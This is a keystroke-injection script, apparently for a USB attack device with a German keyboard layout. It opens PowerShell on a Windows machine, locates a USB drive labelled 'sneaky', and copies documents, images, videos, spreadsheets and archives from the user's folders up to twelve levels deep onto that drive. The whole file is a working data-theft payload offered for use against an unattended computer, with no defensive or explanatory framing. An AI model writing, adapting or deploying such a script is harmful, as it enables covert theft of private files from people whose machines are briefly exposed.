layout('de') //set layout de

delay(15000)
press("GUI r") //Windows + r
delay(500)
type("powershell\n") //Write Powershell + enter
delay(1000)

type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'sneaky'} | select name\n") //Herausfinden was der Usb ist

var filetypes = ["jpg", "jpeg", "png", "gif", "doc", "docx", "mov", "mp4", "mp3", "pdf", "ppt", "ppts", "rar", "wav", "xls", "zip", "txt", "xlsx", "odt", "csv"] //Dateitypen

type("$Test = net share | select-string -Pattern 'Standardfreigabe' -AllMatches\n")  //Ermittlung Wie viele Laufwerke es gibt
type("$Test2 = ($Test -split '       ').Trim()\n")
type("$Test3 = $Test2 | select-string -Pattern ':' -AllMatches\n")
type("$eingabe = $Test3.length\n")

type("$location = pwd | select-string -Pattern 'Users' -AllMatches\n") //Ermittlung des User Verzeichnis
type("$location2 = ($location -split ':').Trim()\n")
type("$location3 = $location2 | select-string -Pattern 'Users' -AllMatches\n")

type("cd $Test3[0]\n")
type("cd $location3\n")
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER
{
	type("copy *." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner
{
	type("copy */*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner
{
	type("copy */*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner
{
	type("copy */*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner     
{
	type("copy */*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}

type("if ($eingabe -eq '2'){cd $Test3[1]}\n")
type("cd $location3\n")
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER
{
	type("copy *." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner
{
	type("copy */*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner
{
	type("copy */*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner
{
	type("copy */*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner     
{
	type("copy */*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}

type("if ($eingabe -eq '3'){cd $Test3[2]}\n")
type("cd $location3\n")
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER
{
	type("copy *." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner
{
	type("copy */*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner
{
	type("copy */*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner
{
	type("copy */*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner     
{
	type("copy */*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}
for (var i = 0;i < filetypes.length; i++) //C:\Users\BENUTZER\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner\Ordner
{
	type("copy */*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")  
}


type("exit\n") //exit